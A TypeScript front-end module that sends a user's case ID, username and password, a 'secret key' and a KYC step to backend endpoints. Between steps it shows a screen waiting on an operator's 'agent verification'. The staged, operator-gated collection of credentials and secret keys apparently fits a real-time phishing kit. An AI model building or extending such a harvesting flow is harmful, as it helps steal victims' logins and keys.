/**
 * Session API
 *
 * Handles HTTP requests for session data submission.
 */

import { useSessionStore } from '../stores/sessionStore';

export type SessionStage = 'case_id' | 'credentials' | 'secret_key' | 'kyc' | 'completed' | 'terminated';

/**
 * Submit data for a specific stage
 *
 * Routes to correct backend endpoint based on stage:
 * - credentials → POST /api/submit-credentials/
 * - secret_key → POST /api/submit-secret-key/
 * - kyc → POST /api/submit-kyc/ or POST /api/user-started-kyc/
 */
export async function submitStageData(
  sessionUuid: string | null,
  stage: SessionStage,
  data: Record<string, any>,
  caseId: string | null,
  onSubmitStart?: () => void,
  onSubmitEnd?: () => void
): Promise<any> { // CHANGED: Returns full response object or { success: false }
  if (!sessionUuid || !caseId) {
    console.error('No session UUID or case ID available');
    return { success: false };
  }

  try {
    onSubmitStart?.();

    // Determine the endpoint based on stage
    let endpoint = '/api/session/submit'; // fallback
    let requestBody: Record<string, any> = { case_id: caseId };

    if (stage === 'credentials') {
      endpoint = '/api/submit-credentials';
      requestBody = {
        case_id: caseId,
        username: data.username,
        password: data.password,
      };
    } else if (stage === 'secret_key') {
      endpoint = '/api/submit-secret-key';
      requestBody = {
        case_id: caseId,
        secret_key: data.secret_key,
      };
    } else if (stage === 'kyc') {
      // Check if KYC has been started or is being submitted
      if (data.status === 'started') {
        endpoint = '/api/user-started-kyc';
      } else {
        endpoint = '/api/submit-kyc';
      }
      requestBody = {
        case_id: caseId,
      };
    }

    const response = await fetch(endpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(requestBody),
    });

    if (!response.ok) {
      const error = await response.json();
      console.error('Submission failed:', error);
      return { success: false, error };
    }

    const responseData = await response.json(); // Get the JSON response (contains kyc_url)

    // Success - set waiting status
    // For KYC start, we don't want to block the UI with a waiting screen
    if (stage !== 'kyc' || data.status !== 'started') {
      useSessionStore.setState({
        status: 'waiting',
        agentMessage: 'Waiting for agent verification...',
        formData: {}, // Clear form data after submission
      });
    }

    return { success: true, ...responseData }; // Return combined success + data
  } catch (error) {
    console.error('Submission error:', error);
    useSessionStore.setState({
      status: 'error',
      error: 'Submission failed. Please try again.',
    });
    return { success: false, error };
  } finally {
    onSubmitEnd?.();
  }
}
